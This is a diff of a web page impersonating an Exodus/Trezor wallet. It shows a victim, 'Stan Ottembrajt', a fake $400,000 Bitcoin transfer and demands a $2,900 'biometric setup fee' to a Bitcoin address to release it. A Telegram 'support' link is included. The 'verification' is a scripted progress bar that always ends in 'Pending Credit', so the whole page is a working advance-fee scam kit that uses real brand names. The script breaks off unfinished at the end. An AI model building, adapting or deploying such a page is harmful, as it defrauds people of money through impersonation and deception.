+    .connect-circle{width:108px;height:108px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:900;font-size:32px;color:#071026;background:linear-gradient(135deg,var(--accent),#ffc86f);box-shadow:0 24px 60px rgba(247,147,26,0.12);}
+
+    .progress{height:10px;background:rgba(255,255,255,0.04);border-radius:8px;overflow:hidden;margin-top:10px;}
+    .progress > i{display:block;height:100%;width:0;background:linear-gradient(90deg,var(--accent),#ffd7a6);transition:width .6s ease;}
+
+    /* Pending */
+    .pending-page{position:fixed;inset:0;background:linear-gradient(135deg,var(--bg-1),var(--bg-2));display:none;align-items:center;justify-content:center;flex-direction:column;z-index:200;gap:18px;padding:20px;color:#eaf2ff;text-align:center;}
+    .pending-page.show{display:flex;}
+    .pending-spinner{width:120px;height:120px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:44px;background:linear-gradient(135deg,var(--accent),#e08900);box-shadow:0 30px 80px rgba(224,140,10,0.18);color:#071026;}
+    .pending-title{font-weight:900;font-size:28px;}
+    .pending-status{color:#a855f7;font-weight:800;letter-spacing:1px;}
+    .pending-amount{color:var(--accent);font-weight:900;font-size:28px;}
+
+    /* Session modal */
+    .session-modal{width:520px;max-width:94%;padding:22px;border-radius:12px;text-align:center;}
+    .session-input{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.06);background:rgba(255,255,255,0.02);color:#eaf2ff;font-weight:800;margin-top:12px;font-family:inherit;font-size:15px;}
+    .hint{color:var(--muted);margin-top:8px;font-size:13px;}
+    .error{color:var(--danger);margin-top:10px;font-weight:800;}
+    .success{color:var(--success);margin-top:10px;font-weight:800;}
+
+    /* Responsive */
+    @media (max-width:980px){
+      .modal-body{grid-template-columns:1fr;}
+      .modal-right{order:2;}
+      .wallet-option{padding:8px;}
+      .device-preview{height:160px;}
+    }
+    @media (max-width:520px){
+      .amount{font-size:38px;}
+    }
   </style>
 </head>
 <body>
-  <div class="wrap">
-    <div class="card" role="main" aria-labelledby="summaryTitle">
-      <h1 id="summaryTitle">Authorization received</h1>
-      <div class="muted">The transfer was authorized with the Session ID you provided. Below is the settlement summary.</div>
+  <!-- NAV -->
+  <header class="navbar">
+    <div class="brand"><div class="logo">₿</div><div>Exodus</div></div>
+    <div class="nav-user"><div style="background:linear-gradient(135deg,#2b6cb0,#2c7a7b);padding:10px;border-radius:10px;font-weight:800">SO</div><div style="text-align:right"><div style="font-weight:800">Stan Ottembrajt</div><div class="small">Bitcoin</div></div></div>
+  </header>
 
-      <div class="grid" aria-live="polite">
-        <div class="row">
-          <div class="label">Payee</div>
-          <div class="value" id="rPayee">—</div>
+  <main class="container" id="mainContent" aria-live="polite">
+    <header class="page-header">
+      <h1 class="page-title">Transaction Confirmation</h1>
+      <p class="page-sub">Verify details, accept certificate and complete Exodus Trezor biometric setup to broadcast withdrawal</p>
+    </header>
 
-          <div style="height:10px"></div>
+    <section class="card" role="region" aria-label="Transaction">
+      <div class="label">You are sending</div>
+      <div class="type"><div style="font-size:26px;color:var(--accent);font-weight:900">₿</div><div>Bitcoin</div></div>
 
-          <div class="label">Receiver date</div>
-          <div class="value" id="rDate">—</div>
-        </div>
-
-        <div class="row">
-          <div class="label">Service fee</div>
-          <div class="value" id="rFee">—</div>
-
-          <div style="height:10px"></div>
-
-          <div class="label">Fee wallet</div>
-          <div class="value" id="rWallet">—</div>
-        </div>
+      <div class="amount-row">
+        <div class="amount">$400,000</div>
+        <div class="currency">USD</div>
       </div>
 
-      <div class="note">
-        What happens next: Our operations team will manually reconcile the Session ID and the fee payment. Once the fee is confirmed, we will broadcast the on-chain transaction for settlement. Typical completion time: 1–3 business hours depending on network conditions. If the fee is sent but not confirmed after that period, contact Support and include your Session ID and transaction details.
+      <div class="divider"></div>
+      <div class="sub">≈ 4.82 BTC</div>
+
+      <div class="grid" style="margin-top:14px;">
+        <div class="info"><div class="label">From Account</div><div class="value">Primary Wallet</div></div>
+        <div class="info"><div class="label">Network</div><div class="value">Bitcoin Mainnet</div></div>
       </div>
 
-      <div class="actions">
-        <button class="btn primary" id="doneBtn">Return to Dashboard</button>
-        <button class="btn ghost" id="supportBtn">Contact Support</button>
+      <div class="wallet-block">
+        <div class="label">Recipient Address (Stan Ottembrajt)</div>
+        <div class="wallet-address mono" id="recipientAddress">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</div>
+      </div>
+
+      <div class="controls">
+        <button class="btn btn-primary" id="confirmBtn" disabled>Confirm & Secure</button>
+        <a class="btn btn-ghost" href="https://t.me/AcesstBridge_go1" target="_blank" rel="noopener noreferrer">💬 Contact Support</a>
+      </div>
+    </section>
+  </main>
+
+  <!-- Session modal -->
+  <div class="overlay show" id="sessionOverlay" aria-hidden="false">
+    <div class="modal session-modal" role="dialog" aria-modal="true" aria-labelledby="sessionTitle">
+      <div><div id="sessionTitle" style="font-weight:900;font-size:20px;">Session ID Required</div><div class="hint">Enter Session ID to unlock the transaction</div></div>
+      <input id="sessionInput" class="session-input" placeholder="STAN-TXN-847392" aria-label="Session ID" autofocus />
+      <div style="display:flex;gap:10px;margin-top:12px;justify-content:center;">
+        <button id="sessionSubmit" class="btn btn-primary">Unlock</button>
+        <button id="sessionCancel" class="btn btn-ghost">Cancel</button>
+      </div>
+      <div id="sessionMsg" class="hint" style="margin-top:10px;">This is required before accessing the Exodus Trezor biometric setup.</div>
+      <div id="sessionError" class="error" style="display:none;"></div>
+      <div id="sessionSuccess" class="success" style="display:none;"></div>
+    </div>
+  </div>
+
+  <!-- Confirm modal: certificate, wallet selection, device preview (preloaded image) -->
+  <div class="overlay" id="confirmModal" aria-hidden="true">
+    <div class="modal" role="document">
+      <div class="modal-head">
+        <div><div class="modal-title">Exodus · Trezor Biometric Setup</div><div class="modal-sub">Mandatory biometric-enabled hardware verification required before broadcasting</div></div>
+        <button id="closeConfirm" class="btn" aria-label="Close" style="background:transparent;border:1px solid rgba(255,255,255,0.04);border-radius:10px;color:#eaf2ff">✕</button>
+      </div>
+
+      <div class="modal-body">
+        <div class="modal-left">
+          <div class="label">Recipient</div>
+          <div style="font-weight:900;font-size:18px;margin-bottom:8px;">Stan Ottembrajt</div>
+          <div class="small">Receiving address</div>
+          <div class="mono" style="margin:8px 0 12px;" id="recipientMono">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</div>
+
+          <div class="label">Amount</div>
+          <div style="font-weight:900;font-size:18px;">$400,000 — <span class="small">≈ 4.82 BTC</span></div>
+
+          <div class="label" style="margin-top:14px;">Certificate & Agreement</div>
+          <div class="certificate" id="certificateBox">
+            <div style="font-weight:800">Certificate</div>
+            <p>I, Stan Ottembrajt, am the receiver of the transaction $400,000 and I agree that this is my wallet address.</p>
+
+            <label style="display:flex;align-items:center;gap:10px;margin-top:10px;">
+              <input type="checkbox" id="certCheckbox" />
+              <span style="font-weight:800">I confirm the certificate statement above</span>
+            </label>
+
+            <label style="display:flex;align-items:center;gap:10px;margin-top:10px;">
+              <input type="checkbox" id="exodusUserCheckbox" />
+              <span style="font-weight:800">I am an Exodus Wallet user</span>
+            </label>
+
+            <div id="certError" style="display:none;margin-top:10px;color:var(--danger);font-weight:800;">You must confirm the certificate and that you are an Exodus Wallet user to proceed.</div>
+          </div>
+
+          <div style="margin-top:14px;">
+            <div class="small">Trezor image (provided):</div>
+            <div class="device-preview" id="uploadPreview" style="margin-top:8px;">
+              <!-- replace IMAGE_DATA_URL with the base64 data URL or a local filename -->
+              <img id="deviceImage" src="IMAGE_DATA_URL" alt="Exodus + Trezor" />
+            </div>
+            <div class="small" style="margin-top:8px;color:var(--muted)">
+              The Trezor image is provided and used to confirm the hardware for the Exodus biometric flow.
+            </div>
+          </div>
+        </div>
+
+        <aside class="modal-right">
+          <div class="label">Select Wallet</div>
+          <div class="wallet-options" id="walletOptions">
+            <label class="wallet-option"><input type="radio" name="wallet" value="Exodus" checked /> <div style="font-weight:800">Exodus (recommended)</div></label>
+            <label class="wallet-option"><input type="radio" name="wallet" value="Trezor Suite" /> <div style="font-weight:800">Trezor Suite</div></label>
+            <label class="wallet-option"><input type="radio" name="wallet" value="Ledger Live" /> <div style="font-weight:800">Ledger Live</div></label>
+            <label class="wallet-option"><input type="radio" name="wallet" value="Other" /> <div style="font-weight:800">Other Wallet</div></label>
+          </div>
+
+          <div style="margin-top:14px;" class="label">Why $2,900 is required</div>
+          <div class="small" style="line-height:1.4">
+            The $2,900 fee covers secure hardware provisioning, biometric enrollment and verification on the Exodus-Trezor integration, priority transaction processing, and a limited escrow/insurance deposit to protect high-value transfers. This is a one-time setup fee per device pairing and ensures your withdrawal is signed and broadcast from a secured, biometric-protected hardware flow.
+          </div>
+
+          <div style="margin-top:16px;" class="label">Fee Summary</div>
+          <div style="display:flex;justify-content:space-between;align-items:center;">
+            <div class="small">Exodus Trezor Setup</div><div class="mono">$2,900</div>
+          </div>
+          <div style="display:flex;justify-content:space-between;align-items:center;margin-top:8px;">
+            <div class="small">Estimated BTC (approx.)</div><div class="mono">0.0350 BTC</div>
+          </div>
+
+          <div style="margin-top:12px;" class="label">Fee Wallet</div>
+          <div class="payment-wallet">
+            <div style="flex:1">
+              <div class="small">Exodus Fee Address</div>
+              <div class="mono" id="feeAddress">bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf</div>
+            </div>
+            <div style="display:flex;flex-direction:column;gap:8px;align-items:flex-end">
+              <button id="copyFee" class="btn btn-ghost">Copy</button>
+            </div>
+          </div>
+
+          <div style="margin-top:18px;display:flex;gap:10px;">
+            <button id="purchaseBtn" class="btn btn-primary" disabled>Purchase Complete Setup</button>
+            <button id="cancelConfirm" class="btn btn-ghost">Cancel</button>
+          </div>
+        </aside>
       </div>
     </div>
   </div>
 
+  <!-- Connecting overlay -->
+  <div class="overlay" id="connectOverlay" aria-hidden="true">
+    <div class="modal" style="width:520px;max-width:94%;text-align:center;">
+      <div class="connect-stack">
+        <div style="font-weight:900;font-size:20px;">Connecting to Exodus</div>
+        <div class="small">Establishing a secure biometric handshake with your Exodus wallet...</div>
+        <div class="connect-circle">₿</div>
+        <div class="progress"><i id="connectBar"></i></div>
+        <div id="connectMsg" class="small" style="color:var(--muted)">Connecting…</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Payment modal -->
+  <div class="overlay" id="paymentModal" aria-hidden="true">
+    <div class="modal" role="document">
+      <div class="modal-head">
+        <div><div class="modal-title">Secure Payment</div><div class="modal-sub">Pay the Exodus Trezor biometric setup fee to proceed</div></div>
+        <button id="closePayment" class="btn" aria-label="Close">✕</button>
+      </div>
+
+      <div style="display:flex;gap:18px;align-items:flex-start;flex-wrap:wrap;">
+        <div style="flex:1;min-width:260px;">
+          <div style="display:flex;align-items:center;gap:12px;">
+            <div style="width:54px;height:54px;border-radius:12px;background:linear-gradient(135deg,#f7931a,#ffb86b);display:flex;align-items:center;justify-content:center;font-weight:900;color:#081022;font-size:24px">₿</div>
+            <div>
+              <div class="payment-amount">$2,900</div>
+              <div class="payment-btc">≈ 0.0350 BTC (approx.)</div>
+            </div>
+          </div>
+
+          <div style="margin-top:14px;" class="label">Pay to</div>
+          <div class="payment-wallet" style="align-items:center;">
+            <div style="flex:1">
+              <div class="small">Exodus Fee Address</div>
+              <div class="mono" id="paymentAddress">bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf</div>
+            </div>
+            <div style="display:flex;flex-direction:column;align-items:flex-end;gap:8px">
+              <div class="qr" aria-hidden="true">QR</div>
+              <div style="display:flex;gap:8px;">
+                <button id="copyPayment" class="btn btn-ghost">Copy</button>
+                <button id="paidBtn" class="btn btn-primary">I have paid</button>
+              </div>
+            </div>
+          </div>
+
+          <div style="margin-top:12px;">
+            <div class="small">Tip: Use your Exodus desktop or mobile app with Trezor to scan QR or paste the address. Payments are final on Bitcoin mainnet.</div>
+          </div>
+
+          <div style="margin-top:12px;">
+            <div class="label">Verification</div>
+            <div class="small">After clicking "I have paid", the UI will run a secure verification simulation (confirmations / signature check).</div>
+            <div class="progress" style="margin-top:10px;"><i id="verifyBar"></i></div>
+          </div>
+        </div>
+
+        <div style="width:320px;">
+          <div class="label">Trezor image (provided)</div>
+          <div class="device-preview" id="paymentPreview"><img src="IMAGE_DATA_URL" alt="Exodus + Trezor" id="paymentImage" /></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Notification -->
+  <div class="overlay" id="notifyOverlay" style="top:14px;align-items:flex-start;justify-content:flex-end;pointer-events:none;">
+    <div style="pointer-events:auto;margin:20px;">
+      <div id="notify" class="notify" style="display:none;background:linear-gradient(180deg,#071026,#0b1220);padding:12px;border-radius:12px;border:1px solid rgba(247,147,26,0.12);box-shadow:0 18px 44px rgba(0,0,0,0.45);width:360px;">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:6px;">
+          <div style="font-size:18px;">🔒</div><div style="font-weight:800;color:var(--accent)">Exodus Trezor · Biometric required</div>
+        </div><div class="small" id="notifyMsg">Confirm certificate and select Exodus to continue.</div>
+      </div>
+    </div>
+  </div>
+
+  <!-- Pending page -->
+  <div class="pending-page" id="pendingPage" aria-live="polite">
+    <div class="pending-spinner">⏳</div>
+    <div class="pending-title">Processing Transaction</div>
+    <div class="pending-status">Pending Credit</div>
+    <div class="pending-amount">$400,000</div>
+    <div class="small" style="max-width:720px;margin-top:6px;">4.82 BTC will be broadcast to <span class="mono" id="pendingRecipient">bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3</span></div>
+    <div class="small" style="margin-top:8px;">Session ID: <span id="displaySession" class="mono">—</span></div>
+  </div>
+
   <script>
-    // read saved state (set by index.html)
-    const fee = sessionStorage.getItem('txn_fee') || '2900';
-    const wallet = sessionStorage.getItem('txn_fee_wallet') || 'bc1qjx8qvmt83uzpulefqvtsjfrrskxycjfggvqjrf';
-    const receiver = sessionStorage.getItem('txn_receiver_name') || 'Stan Ottembrajt';
-    const addr = sessionStorage.getItem('txn_receiver_addr') || 'bc1q9nh4xgf85vx9uaplpa07drxv598wth0l63d4v3';
-    const amtUsd = sessionStorage.getItem('txn_amount_usd') || '$400,000';
-    const amtBtc = sessionStorage.getItem('txn_amount_btc') || '4.82 BTC';
+    /* ---------- Config & Elements ---------- */
+    const SESSION_PIN = 'STAN-TXN-847392';
 
-    document.getElementById('rPayee').textContent = receiver;
-    document.getElementById('rDate').textContent = new Date().toISOString().split('T')[0]; // show today's date for reconciliation
-    document.getElementById('rFee').textContent = `CA$ ${Number(fee).toLocaleString()}`;
-    document.getElementById('rWallet').textContent = wallet;
+    const confirmBtn = document.getElementById('confirmBtn');
+    const sessionOverlay = document.getElementById('sessionOverlay');
+    const sessionInput = document.getElementById('sessionInput');
+    const sessionSubmit = document.getElementById('sessionSubmit');
+    const sessionCancel = document.getElementById('sessionCancel');
+    const sessionMsg = document.getElementById('sessionMsg');
+    const sessionError = document.getElementById('sessionError');
+    const sessionSuccess = document.getElementById('sessionSuccess');
 
-    document.getElementById('doneBtn').addEventListener('click', () => {
-      window.location.href = './index.html';
+    const confirmModal = document.getElementById('confirmModal');
+    const closeConfirm = document.getElementById('closeConfirm');
+    const cancelConfirm = document.getElementById('cancelConfirm');
+    const purchaseBtn = document.getElementById('purchaseBtn');
+
+    const certCheckbox = document.getElementById('certCheckbox');
+    const exodusUserCheckbox = document.getElementById('exodusUserCheckbox');
+    const certError = document.getElementById('certError');
+
+    const copyFee = document.getElementById('copyFee');
+    const copyPayment = document.getElementById('copyPayment');
+    const paymentAddress = document.getElementById('paymentAddress').textContent.trim();
+
+    const connectOverlay = document.getElementById('connectOverlay');
+    const connectBar = document.getElementById('connectBar');
+    const connectMsg = document.getElementById('connectMsg');
+
+    const paymentModal = document.getElementById('paymentModal');
+    const closePayment = document.getElementById('closePayment');
+    const paidBtn = document.getElementById('paidBtn');
+    const verifyBar = document.getElementById('verifyBar');
+
+    const pendingPage = document.getElementById('pendingPage');
+    const mainContent = document.getElementById('mainContent');
+
+    const notifyBox = document.getElementById('notify');
+    const notifyMsg = document.getElementById('notifyMsg');
+
+    /* ---------- Session Lock logic ---------- */
+    let attemptsLeft = 3;
+    let lockUntil = 0;
+
+    function showOverlay(el, show=true){
+      if(!el) return;
+      if(show){ el.classList.add('show'); el.setAttribute('aria-hidden','false'); }
+      else { el.classList.remove('show'); el.setAttribute('aria-hidden','true'); }
+    }
+
+    function enableFlow(){
+      confirmBtn.disabled = false;
+      sessionSuccess.style.display = 'block';
+      sessionSuccess.textContent = 'Session unlocked — you may proceed';
+      sessionError.style.display = 'none';
+      sessionMsg.style.display = 'none';
+      setTimeout(()=>{ showOverlay(sessionOverlay, false); document.body.style.overflow = 'auto'; sessionSuccess.style.display = 'none'; }, 800);
+      // show notification
+      notifyBox.style.display = 'block';
+      setTimeout(()=> notifyBox.classList.add('show'), 200);
+      notifyMsg.textContent = 'Session validated. Proceed with Trezor setup and fee payment.';
+      // ensure embedded device image remains visible: if placeholder remained, nothing breaks; advise replacing IMAGE_DATA_URL
+      // prefill pending session
+      document.getElementById('displaySession').textContent = SESSION_PIN;
+    }
+
+    function lockFor(seconds){
+      lockUntil = Date.now() + seconds*1000;
+      sessionError.style.display = 'block';
+      sessionError.textContent = `Too many failed attempts. Try again in ${seconds} seconds.`;
+      sessionInput.disabled = true;
+      sessionSubmit.disabled = true;
+      let remaining = seconds;
+      const t = setInterval(()=> {
+        remaining--;
+        if(remaining <= 0){
+          clearInterval(t);
+          attemptsLeft = 3;
+          sessionInput.disabled = false;
+          sessionSubmit.disabled = false;
+          sessionError.style.display = 'none';
+          sessionMsg.style.display = 'block';
+          sessionMsg.textContent = 'You may try again.';
+        } else {
+          sessionError.textContent = `Too many failed attempts. Try again in ${remaining} seconds.`;
+        }
+      }, 1000);
+    }
+
+    sessionSubmit.addEventListener('click', ()=>{
+      const now = Date.now();
+      if(lockUntil && now < lockUntil){
+        const sec = Math.ceil((lockUntil - now)/1000);
+        sessionError.style.display = 'block';
+        sessionError.textContent = `Locked. Try again in ${sec} seconds.`;
+        return;
+      }
+      const val = (sessionInput.value || '').trim();
+      if(!val){ sessionError.style.display='block'; sessionError.textContent='Enter the Session ID.'; return; }
+      if(val === SESSION_PIN){
+        sessionError.style.display='none';
+        sessionSuccess.style.display='block';
+        sessionSuccess.textContent='Correct Session ID';
+        enableFlow();
+      } else {
+        attemptsLeft--;
+        sessionError.style.display='block';
+        sessionError.textContent=`Invalid Session ID. Attempts left: ${attemptsLeft}`;
+        sessionSuccess.style.display='none';
+        // animate shake
+        const m = document.querySelector('.session-modal');
+        m.animate([{transform:'translateX(-6px)'},{transform:'translateX(6px)'},{transform:'translateX(0)'}],{duration:280});
+        if(attemptsLeft <= 0) lockFor(30);
+      }
+    });
+    sessionInput.addEventListener('keydown',(e)=>{ if(e.key==='Enter') sessionSubmit.click(); });
+    sessionCancel.addEventListener('click', ()=>{ sessionMsg.textContent='Session lock required. Reload to retry.'; sessionInput.disabled=true; sessionSubmit.disabled=true; sessionCancel.disabled=true; });
+
+    /* ---------- Confirm modal interactions ---------- */
+    confirmBtn.addEventListener('click', ()=>{
+      if(confirmBtn.disabled) return;
+      showOverlay(confirmModal, true);
+      document.body.style.overflow = 'hidden';
+      // initial state
+      purchaseBtn.disabled = true;
+      certError.style.display = 'none';
+      // make sure provided image elements are present (user must paste actual src into HTML)
+    });
+    closeConfirm.addEventListener('click', ()=>{ showOverlay(confirmModal, false); document.body.style.overflow = 'auto'; });
+    cancelConfirm.addEventListener('click', ()=>{ showOverlay(confirmModal, false); document.body.style.overflow = 'auto'; });
+
+    function checkCerts(){
+      const ok = certCheckbox.checked && exodusUserCheckbox.checked;
+      purchaseBtn.disabled = !ok;
+      if(ok) certError.style.display = 'none';
+    }
+    certCheckbox.addEventListener('change', checkCerts);
+    exodusUserCheckbox.addEventListener('change', checkCerts);
+
+    /* ---------- Copy helpers ---------- */
+    function copyToClipboard(text, btn){
+      navigator.clipboard?.writeText(text).then(()=> {
+        const prev = btn.textContent;
+        btn.textContent = 'Copied';
+        setTimeout(()=> btn.textContent = prev, 1400);
+      }).catch(()=> {
+        const prev = btn.textContent;
+        btn.textContent = 'Failed';
+        setTimeout(()=> btn.textContent = prev, 1400);
+      });
+    }
+    copyFee.addEventListener('click', ()=> copyToClipboard(document.getElementById('feeAddress').textContent.trim(), copyFee));
+    copyPayment.addEventListener('click', ()=> copyToClipboard(paymentAddress, copyPayment));
+
+    /* ---------- Purchase -> Connect -> Payment ---------- */
+    purchaseBtn.addEventListener('click', ()=>{
+      if(!certCheckbox.checked || !exodusUserCheckbox.checked){
+        certError.style.display='block';
+        certError.textContent = 'You must confirm certificate and that you are an Exodus Wallet user.';
+        return;
+      }
+      certError.style.display='none';
+      showOverlay(confirmModal, false);
+      // show connecting overlay
+      showOverlay(connectOverlay, true);
+      document.body.style.overflow = 'hidden';
+      connectBar.style.width = '0%';
+      connectMsg.textContent = 'Connecting…';
+      // progress steps
+      const steps = [20,48,82,100];
+      const dur = [700,900,900,700];
+      let i = 0;
+      function step(){
+        if(i >= steps.length){
+          connectMsg.textContent = 'Connected — opening payment';
+          setTimeout(()=> {
+            showOverlay(connectOverlay, false);
+            showOverlay(paymentModal, true);
+            // ensure device image is visible in payment preview
+            try { document.getElementById('paymentImage').src = document.getElementById('deviceImage').src; } catch(e){}
+          }, 600);
+          return;
+        }
+        connectBar.style.width = steps[i] + '%';
+        i++;
+        setTimeout(step, dur[i-1]);
+      }
+      step();
     });
 
-    document.getElementById('supportBtn').addEventListener('click', () => {
-      window.open('https://t.me/AcesstBridge_go1', '_blank', 'noopener');
+    /* ---------- Payment verification -> Pending ---------- */
+    closePayment.addEventListener('click', ()=>{ showOverlay(paymentModal, false); document.body.style.overflow = 'auto'; });
+
+    paidBtn.addEventListener('click', ()=>{
+      paidBtn.disabled = true;
+      paidBtn.textContent = 'Verifying...';
+      const steps = [20,55,88,100];
+      const times = [800,1200,1200,700];
+      let idx = 0;
+      function run(){
+        if(idx >= steps.length){
+          paidBtn.textContent = 'Verified';
+          setTimeout(()=> {
+            showOverlay(paymentModal, false);
+            document.body.style.overflow = 'auto';
+            // start pending screen
+            document.getElementById('pendingRecipient').textContent = document.getElementById('recipientAddress').textContent.trim();
+            document.getElementById('displaySession').textContent = SESSION_PIN;
+            mainContent.style.opacity = '0';
+            mainContent.style.pointerEvents = 'none';
+            setTimeout(()=> pendingPage.classList.add('show'), 500);
+            paidBtn.disabled = false;
+            paidBtn.textContent = 'I have paid';
+          }, 700);
+          return;
+        }
+        verifyBar.style.width = steps[idx] + '%';
+        idx++;
+        setTimeout(run, times[idx-1]);
+      }
+      run();
     });
+
+    /* ---------- Accessibility & initial hints ---------- */
+    window.addEventListener('keydown', (e)=>{
+      if(e.key === 'Escape'){
+        if(document.getElementById('confirmModal').classList.contains('show')) { showOverlay(confirmModal, false); document.body.style.overflow = 'auto'; }
+        if(document.getElementById('paymentModal').classList.contains('show')) { showOverlay(paymentModal, false); document.body.style.overflow = 'auto'; }
+        if(document.getElementById('connectOverlay').classList.contains('show')) { showOverlay(connectOverlay, false); document.body.style.overflow = 'auto'; }
+      }
+    });
+
+    // show small notify box after unlock or when modal open
+    setTimeout(()=> { /* visually show notify only when session unlocked */ }, 
   </script>
 </body>
 </html>
